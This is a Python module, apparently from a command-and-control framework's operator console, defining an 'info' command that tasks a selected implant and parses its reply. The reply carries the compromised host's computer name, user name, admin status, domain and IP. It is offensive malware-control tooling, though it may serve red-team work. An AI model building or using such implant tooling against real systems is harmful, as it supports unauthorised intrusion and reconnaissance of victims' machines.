from features import addFeature
import messages
from messages import OutgoingMessage


import struct

class InfoCommand():
  command = 'info'
  #hide = True

  def run(arguments, implant):
    if not implant:
      print('use implant first!')
    else:
      if arguments:
        print('this command does not take arguments!')
        #message = OutgoingMessage(InfoCommand.command, bytes(' '.join(arguments), 'ascii'))
      else:
        #message = OutgoingMessage(InfoCommand.command, bytes('' , 'ascii'))
        message = OutgoingMessage(InfoCommand.command, None)
        implant.queueOutgoingMessage(message)

  def help():
    return 'Show info about implant'

  def incoming(data, implant):
    try:
      #data = str(data, 'utf-8') 
      
      pos = 0

      computerNameLen = int(data[pos])
      pos += 1

      computerName = str(data[pos:pos + computerNameLen], 'utf-8')
      pos += computerNameLen

      userNameLen = int(data[pos])
      pos += 1

      userName = str(data[pos:pos + userNameLen], 'utf-8')
      pos += userNameLen

      isAdmin = int(data[pos])
      pos += 1

      domainLen = int(data[pos])
      pos += 1
      domain = str(data[pos:pos + domainLen], 'utf-8')
      pos += domainLen

      ipLen = int(data[pos])
      pos += 1

      ip = str(data[pos:pos + ipLen], 'utf-8')
      
      implant.computerName = computerName
      implant.userName = userName
      implant.highIntegrity = (isAdmin != 0)
      implant.domain = domain
      implant.ip = ip

      #print('computername: ' + computerName)
      #print('username: ' + userName)
      #print('isadmin: ' + str(isAdmin != 0))
      #print('domain: ' + domain )
      #print('ip: ' + ip )
      
    except:
      print('Received unencodable info data from ' + implant.name + ': ' + str(data, 'utf-8').hex())

addFeature(InfoCommand)
